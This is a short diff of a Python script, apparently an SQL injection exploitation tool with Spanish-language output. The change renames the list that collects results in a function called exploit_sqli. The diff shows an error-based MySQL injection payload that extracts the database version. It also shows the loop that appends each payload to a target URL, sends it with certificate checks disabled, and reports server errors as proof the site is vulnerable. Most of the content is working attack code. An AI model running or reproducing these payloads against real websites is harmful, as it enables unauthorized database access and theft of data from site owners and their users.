@@ -130,13 +130,13 @@ def exploit_sqli(url):
         "(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))"
     ]
 
-    vulnerable_urls = []
+    vulnerable_payloads = []
     for payload in payloads:
         target_url = url + payload
         try:
             r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
             if 500 <= r.status_code < 600:
-                vulnerable_urls.append((target_url, payload))
+                vulnerable_payloads.append((payload))
                 print(f"[+] URL vulnerable detectada: {target_url} con el payload: {payload}")
                 
         except SSLError:
@@ -144,7 +144,7 @@ def exploit_sqli(url):
         except requests.RequestException:
             return False
 
-    return vulnerable_urls
+    return vulnerable_payloads
 
 def exploit_sqli_column_number(url):
     """
